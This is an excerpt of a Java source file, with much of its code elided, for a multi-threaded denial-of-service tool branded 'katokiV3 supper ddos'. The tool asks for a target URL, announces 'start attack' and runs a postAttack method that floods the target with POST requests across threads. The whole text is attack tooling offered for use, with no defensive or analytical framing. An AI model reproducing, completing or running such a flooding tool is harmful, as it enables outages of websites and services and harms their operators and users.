...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.print("import wed need katokiV3 supper ddos: ");
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("start attack: " + url);

        String[] SUrl = url.split("://");

        System.out.println("welcome to katokiV3 supper");
        ...
        System.out.println("katokiV3 supper ©Trần Gia Hưng");
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("katokiV3 supper starting attack: " + responseCode + "Thread: " + this.seq);
    }
